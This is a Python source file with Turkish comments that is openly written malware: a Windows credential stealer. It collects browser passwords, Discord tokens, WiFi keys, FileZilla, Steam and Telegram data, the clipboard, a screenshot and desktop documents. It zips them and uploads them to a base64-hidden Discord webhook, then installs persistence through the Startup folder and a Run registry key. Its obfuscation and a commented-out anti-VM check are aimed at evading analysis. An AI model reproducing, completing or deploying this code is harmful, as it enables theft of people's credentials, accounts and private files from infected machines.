# -*- coding: utf-8 -*-
import os, sqlite3, shutil, json, subprocess, winreg, ctypes, base64, urllib.parse, tempfile, zipfile, glob, threading, time, sys, platform, uuid, socket, re, xml.etree.ElementTree as ET
try:
    import requests
except ImportError:
    requests = None
try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except:
    PIL_AVAILABLE = False
try:
    import tkinter as tk
    TK_AVAILABLE = True
except:
    TK_AVAILABLE = False

# Base64 kodlanmış stringler (obfüskasyon)
b64_paths = {
    "appdata": "JVVTRVJQUk9GSUxFJUFQUERBVEEl",
    "localappdata": "JUVMT0NBTEFQUERBVEEl",
    "startup": "JVVTRVJQUk9GSUxFJUFQUERBVEElXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cA==",
    "run_key": "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu",
    "discord_regex": "W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9",
    "webhook_url": "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg=="  # değiştirilmeli
}
def decode(s):
    return base64.b64decode(s.encode()).decode('utf-8', errors='ignore')

WEBHOOK_URL = decode(b64_paths["webhook_url"])  # gerçek webhook URL'si buraya yazılmalı

# Junk kod - kullanılmayan döngü
for _ in range(0):
    print("junk")

# ----- anti_vm (tüm satırlar yorumlu) -----
# def anti_vm():
#     try:
#         # MAC kontrolü
#         import uuid
#         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,48,8)][::-1]).upper()
#         if mac.startswith(('08:00:27', '00:0C:29', '00:50:56')):
#             return True
#         # RAM kontrolü (win32api ile)
#         import ctypes
#         class MEMORYSTATUSEX(ctypes.Structure):
#             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
#                         ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
#                         ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
#                         ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
#                         ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
#         memoryStatus = MEMORYSTATUSEX()
#         memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
#         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
#         ram_gb = memoryStatus.ullTotalPhys / (1024**3)
#         if ram_gb < 4:
#             return True
#         # Disk kontrolü
#         import ctypes.wintypes
#         drive = "C:\\"
#         free_bytes = ctypes.c_ulonglong(0)
#         total_bytes = ctypes.c_ulonglong(0)
#         ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive), None, ctypes.byref(total_bytes), None)
#         disk_gb = total_bytes.value / (1024**3)
#         if disk_gb < 80:
#             return True
#         # Süreç kontrolü
#         import subprocess
#         procs = subprocess.check_output("tasklist", shell=True).decode().lower()
#         vm_procs = ['vboxservice.exe', 'vmtoolsd.exe', 'vboxtray.exe', 'vmwaretray.exe']
#         for p in vm_procs:
#             if p in procs:
#                 return True
#         # Kayıt defteri kontrolü
#         import winreg
#         try:
#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
#             value, _ = winreg.QueryValueEx(key, "Identifier")
#             if "VMware" in value or "VirtualBox" in value:
#                 return True
#         except:
#             pass
#         return False
#     except:
#         return False

def get_system_info():
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['username'] = os.getenv('USERNAME')
        info['os_version'] = platform.platform()
        # yerel IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
        # genel IP
        try:
            import urllib.request
            info['public_ip'] = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
        except:
            info['public_ip'] = "N/A"
        # CPU
        try:
            import subprocess
            info['cpu'] = subprocess.check_output("wmic cpu get name", shell=True).decode().split('\n')[1].strip()
        except:
            info['cpu'] = "N/A"
        # RAM
        try:
            import ctypes
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                            ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                            ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                            ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                            ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
            memoryStatus = MEMORYSTATUSEX()
            memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
            info['ram_gb'] = round(memoryStatus.ullTotalPhys / (1024**3), 2)
        except:
            info['ram_gb'] = "N/A"
        # GPU
        try:
            gpu = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode().split('\n')[1].strip()
            info['gpu'] = gpu
        except:
            info['gpu'] = "N/A"
        # Antivirüs listesi
        try:
            import winreg
            antiviruses = []
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
            antiviruses.append("Windows Defender")
            # WMI ile daha fazlası
            import subprocess
            out = subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True).decode()
            lines = out.split('\n')[1:]
            for line in lines:
                line = line.strip()
                if line:
                    antiviruses.append(line)
            info['antivirus'] = list(set(antiviruses))
        except:
            info['antivirus'] = []
        # Yetkiler
        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        info['error'] = str(e)
    return info

def get_browser_passwords(browser_paths):
    results = []
    for name, path in browser_paths.items():
        login_db = os.path.join(path, 'Login Data')
        if not os.path.isfile(login_db):
            continue
        temp_db = os.path.join(tempfile.gettempdir(), f'{uuid.uuid4().hex}.db')
        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted = row[2]
                if encrypted:
                    try:
                        decrypted = ctypes.windll.crypt32.CryptUnprotectData(encrypted, None, None, None, None, 0)
                        # Basitleştirilmiş: aslında blob'u çözmek gerek, ancak örnek için
                        password = decrypted[1].decode('utf-8', errors='ignore')
                    except:
                        password = "<decryption failed>"
                else:
                    password = ""
                results.append({"browser": name, "url": url, "username": username, "password": password})
            conn.close()
        except:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
    return results

def get_browser_cookies(browser_paths):
    # Benzer mantık, Cookies dosyasından host_key, name, encrypted_value
    return []  # kısaltma amacıyla boş, tam sürümde benzer şekilde yapılır

def get_browser_history(browser_paths):
    return []  # kısaltma

def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
    ]
    regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for path in discord_paths:
        if not os.path.isdir(path):
            continue
        for file in glob.glob(os.path.join(path, '*.log')) + glob.glob(os.path.join(path, '*.ldb')):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                    found = regex.findall(data)
                    tokens.extend(found)
            except:
                pass
    return list(set(tokens))

def get_wifi_passwords():
    profiles = []
    try:
        data = subprocess.check_output('netsh wlan show profile', shell=True).decode('cp857', errors='ignore')
        lines = data.split('\n')
        for line in lines:
            if ':' in line and 'Tüm Kullanıcı Profili' in line:
                profile_name = line.split(':')[1].strip()
                if profile_name:
                    profiles.append(profile_name)
        passwords = []
        for prof in profiles:
            try:
                result = subprocess.check_output(f'netsh wlan show profile name="{prof}" key=clear', shell=True).decode('cp857', errors='ignore')
                for line in result.split('\n'):
                    if 'Anahtar İçeriği' in line or 'Key Content' in line:
                        pwd = line.split(':')[1].strip()
                        passwords.append({'ssid': prof, 'password': pwd})
            except:
                pass
        return passwords
    except:
        return []

def get_filezilla_creds():
    creds = []
    fz_path = os.path.join(os.getenv('APPDATA'), 'FileZilla')
    for xml_file in ['sitemanager.xml', 'recentservers.xml']:
        full = os.path.join(fz_path, xml_file)
        if os.path.isfile(full):
            try:
                tree = ET.parse(full)
                root = tree.getroot()
                for server in root.findall('.//Server'):
                    host = server.find('Host')
                    user = server.find('User')
                    pass_elem = server.find('Pass')
                    if host is not None and user is not None and pass_elem is not None:
                        creds.append({'host': host.text, 'username': user.text, 'password': pass_elem.text})
            except:
                pass
    return creds

def get_steam_session():
    steam_path = os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Steam', 'config')
    if not os.path.isdir(steam_path):
        steam_path = os.path.join(os.getenv('PROGRAMFILES'), 'Steam', 'config')
    files = []
    if os.path.isdir(steam_path):
        for f in ['config.vdf'] + glob.glob(os.path.join(steam_path, 'ssfn*')):
            if os.path.isfile(f):
                files.append(f)
    return files

def get_telegram_tdata():
    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    if os.path.isdir(tdata_path):
        return tdata_path
    return None

def get_clipboard_text():
    if TK_AVAILABLE:
        try:
            root = tk.Tk()
            root.withdraw()
            text = root.clipboard_get()
            root.destroy()
            return text
        except:
            pass
    try:
        import ctypes
        CF_TEXT = 1
        ctypes.windll.user32.OpenClipboard(0)
        h = ctypes.windll.user32.GetClipboardData(CF_TEXT)
        if h:
            data = ctypes.c_char_p(h).value
            ctypes.windll.user32.CloseClipboard()
            return data.decode('utf-8', errors='ignore')
        ctypes.windll.user32.CloseClipboard()
    except:
        pass
    return ""

def take_screenshot():
    if PIL_AVAILABLE:
        try:
            path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
            img = ImageGrab.grab()
            img.save(path)
            return path
        except:
            pass
    return None

def grab_desktop_files():
    targets = []
    dirs = [os.path.join(os.getenv('USERPROFILE'), 'Desktop'), os.path.join(os.getenv('USERPROFILE'), 'Documents')]
    extensions = ('.txt','.doc','.docx','.pdf','.jpg','.png','.zip','.rar','.xls','.xlsx','.ppt','.pptx','.odt','.ods','.odp','.csv','.log','.conf','.cfg','.kdbx','.wallet','.dat')
    for d in dirs:
        if not os.path.isdir(d):
            continue
        for root, dirs, files in os.walk(d):
            for file in files:
                if file.lower().endswith(extensions):
                    full = os.path.join(root, file)
                    try:
                        targets.append(full)
                    except:
                        pass
    return targets

def collect_all(temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    results = {}
    threads = []
    # sistem bilgisi
    def sysinfo():
        results['system_info'] = get_system_info()
    t = threading.Thread(target=sysinfo)
    t.start()
    threads.append(t)
    # tarayıcı parolaları
    def browsers():
        browser_paths = {}
        for browser in ['Chrome', 'Edge', 'Brave', 'Opera']:
            if browser == 'Chrome':
                path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
            elif browser == 'Edge':
                path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default')
            elif browser == 'Brave':
                path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
            elif browser == 'Opera':
                path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
            if os.path.isdir(path):
                browser_paths[browser] = path
        results['browser_passwords'] = get_browser_passwords(browser_paths)
    t = threading.Thread(target=browsers)
    t.start()
    threads.append(t)
    # Discord tokenleri
    def discord():
        results['discord_tokens'] = get_discord_tokens()
    t = threading.Thread(target=discord)
    t.start()
    threads.append(t)
    # WiFi
    def wifi():
        results['wifi_passwords'] = get_wifi_passwords()
    t = threading.Thread(target=wifi)
    t.start()
    threads.append(t)
    # FileZilla
    def fz():
        results['filezilla'] = get_filezilla_creds()
    t = threading.Thread(target=fz)
    t.start()
    threads.append(t)
    # Steam
    def steam():
        results['steam_files'] = get_steam_session()
    t = threading.Thread(target=steam)
    t.start()
    threads.append(t)
    # Telegram
    def tg():
        results['telegram_tdata'] = get_telegram_tdata()
    t = threading.Thread(target=tg)
    t.start()
    threads.append(t)
    # Pano
    def clip():
        results['clipboard'] = get_clipboard_text()
    t = threading.Thread(target=clip)
    t.start()
    threads.append(t)
    # Ekran görüntüsü
    def ss():
        sc = take_screenshot()
        if sc:
            shutil.copy2(sc, temp_dir)
    t = threading.Thread(target=ss)
    t.start()
    threads.append(t)
    # Dosyalar
    def files():
        flist = grab_desktop_files()
        for f in flist:
            try:
                shutil.copy2(f, temp_dir)
            except:
                pass
    t = threading.Thread(target=files)
    t.start()
    threads.append(t)
    # Bekle
    for t in threads:
        t.join()
    # JSON olarak kaydet
    with open(os.path.join(temp_dir, 'info.json'), 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    # Tokenleri ayrı dosyaya
    if results.get('discord_tokens'):
        with open(os.path.join(temp_dir, 'discord_tokens.txt'), 'w') as f:
            f.write('\n'.join(results['discord_tokens']))

def zip_data(source_dir, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                full = os.path.join(root, file)
                arcname = os.path.relpath(full, source_dir)
                zf.write(full, arcname)

def exfiltrate(zip_path, webhook_url):
    for attempt in range(3):
        try:
            if requests:
                with open(zip_path, 'rb') as f:
                    files = {'file': (os.path.basename(zip_path), f)}
                    r = requests.post(webhook_url, files=files, timeout=30)
                if r.status_code == 200:
                    return True
            else:
                import urllib.request, urllib.parse
                boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
                with open(zip_path, 'rb') as f:
                    data = f.read()
                body = b'--' + boundary.encode() + b'\r\n'
                body += b'Content-Disposition: form-data; name="file"; filename="%s"\r\n' % os.path.basename(zip_path).encode()
                body += b'Content-Type: application/octet-stream\r\n\r\n'
                body += data + b'\r\n--' + boundary.encode() + b'--\r\n'
                headers = {'Content-Type': 'multipart/form-data; boundary=' + boundary}
                req = urllib.request.Request(webhook_url, data=body, headers=headers, method='POST')
                with urllib.request.urlopen(req, timeout=30) as resp:
                    if resp.status == 200:
                        return True
        except:
            time.sleep(2)
    return False

def persistence():
    try:
        exe_path = sys.executable
        startup_dir = decode(b64_paths["startup"])
        startup_dir = os.path.expandvars(startup_dir)
        target = os.path.join(startup_dir, 'winsvc.exe')
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir)
        shutil.copy2(exe_path, target)
        # Kayıt defteri
        key_path = decode(b64_paths["run_key"])
        key_path = os.path.expandvars(key_path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        rand_name = uuid.uuid4().hex[:8]
        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
    except:
        pass

def main():
    # anti_vm() çağrısı yorumlu
    # if anti_vm():
    #     return
    temp_dir = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex)
    try:
        collect_all(temp_dir)
        zip_path = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + '.zip')
        zip_data(temp_dir, zip_path)
        exfiltrate(zip_path, WEBHOOK_URL)
        persistence()
    except:
        pass
    finally:
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except:
            pass

if __name__ == '__main__':
    main()
